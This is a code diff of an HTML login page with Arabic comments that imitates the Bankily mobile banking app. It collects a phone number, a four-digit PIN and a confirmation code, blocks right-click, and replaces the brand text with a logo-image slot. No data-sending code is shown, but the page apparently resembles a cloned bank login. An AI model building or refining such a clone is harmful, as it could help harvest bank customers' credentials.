@@ -72,37 +72,26 @@
         /* المحتوى الداخلي */
         .app-content {
             flex: 1;
-            padding: 40px 30px 20px 30px;
+            padding: 20px 30px 20px 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        /* الشعار */
-        .brand-logo {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-
-        .brand-logo h1 {
-            color: var(--primary-teal);
-            font-size: 2.6rem;
-            font-weight: bold;
-            letter-spacing: -0.5px;
-        }
-
-        .brand-logo p {
-            color: var(--text-gray);
-            font-size: 0.85rem;
-            letter-spacing: 3px;
-            margin-top: -5px;
-            font-weight: 500;
+        /* مساحة مخصصة وفارغة في الأعلى لصورة الشعار (اللوجو البصري) */
+        .brand-logo-space {
+            width: 100%;
+            height: 140px; /* مساحة كافية وممتازة للشعار */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
         }
 
         /* مجموعات الإدخال */
         .input-group {
             width: 100%;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             position: relative;
             text-align: right;
         }
@@ -112,7 +101,7 @@
             font-size: 0.95rem;
             font-weight: bold;
             color: #111;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
 
         /* حاوية الحقل مع الأيقونة */
@@ -151,17 +140,23 @@
             z-index: 5;
         }
 
-        /* التعديل الذهبي: نقل حقل الرقم السري لليمين وتقليص حجمه لنصف حجم حقل الهاتف */
+        /* تعديل حقل الرقم السري ليكون محاذياً لليمين تماماً وبعرض نصف حقل الهاتف */
+        .password-wrapper-box {
+            display: flex;
+            justify-content: flex-start; /* البدء من اليمين مباشرة تحت النص */
+            width: 100%;
+        }
+
         .password-container {
             display: flex;
             justify-content: space-between;
-            width: 50%; /* نصف حجم حقل الهاتف تماماً كما في الدائرة */
-            margin-right: 45px; /* إزاحة جهة اليمين لتفادي التداخل مع الأيقونة والاصطفاف تحت النص المكتوب */
-            direction: ltr !important; /* الحفاظ على الكتابة من اليسار لليمين */
+            width: 45%; /* قدره نصف حقل رقم الهاتف تماماً */
+            margin-right: 45px; /* إزاحة لتفادي التداخل مع الأيقونة وبدء الاصطفاف الصحيح */
+            direction: ltr !important; /* الحفاظ على التنقل البرمجي LTR */
         }
 
         .password-field {
-            width: 28px;
+            width: 24px;
             height: 35px;
             border: none;
             border-bottom: 2px solid #222;
@@ -173,9 +168,10 @@
             direction: ltr !important;
         }
 
-        /* الروابط المساعدة */
+        /* الروابط المساعدة المنظمة في الأسفل */
         .helper-links {
-            margin-top: 25px;
+            margin-top: auto; /* دفع الروابط لتستقر في الجزء السفلي بشكل متناسق */
+            margin-bottom: 20px;
             text-align: center;
             width: 100%;
             line-height: 2.2;
@@ -184,7 +180,7 @@
         .helper-links a {
             color: #222;
             text-decoration: underline;
-            font-size: 0.9rem;
+            font-size: 0.92rem;
             font-weight: 500;
         }
 
@@ -253,7 +249,6 @@
             font-weight: bold;
             cursor: pointer;
             outline: none;
-            margin-top: auto;
         }
 
         .footer-button:active {
@@ -275,10 +270,9 @@
         </div>
 
         <div id="loginSection" class="app-content">
-            <div class="brand-logo">
-                <h1>Bankily</h1>
-                <p>PAR BPM</p>
-            </div>
+            
+            <div class="brand-logo-space">
+                </div>
 
             <div class="input-group">
                 <label>اسم المستخدم أو رقم الهاتف</label>
@@ -293,11 +287,13 @@
                 <div class="input-wrapper">
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
                     
-                    <div class="password-container">
-                        <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
-                        <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
-                        <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
-                        <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 4)">
+                    <div class="password-wrapper-box">
+                        <div class="password-container">
+                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
+                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
+                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
+                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 4)">
+                        </div>
                     </div>
                 </div>
             </div>
@@ -323,7 +319,7 @@
 
             <div class="green-circle"></div>
 
-            <div class="helper-links">
+            <div class="helper-links" style="margin-top: 0;">
                 <a href="#" style="color: #444; font-weight: normal;">إعادة إرسال رمز التأكيد</a>
             </div>
         </div>
@@ -333,7 +329,7 @@
     </div>
 
     <script>
-        // --- حظر النقر بزر الماوس الأيمن والأوسط تماماً حمايةً للواجهة ---
+        // --- حظر النقر بزر الماوس الأيمن والأوسط تماماً حمايةً للواجهة والهوية ---
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
         });
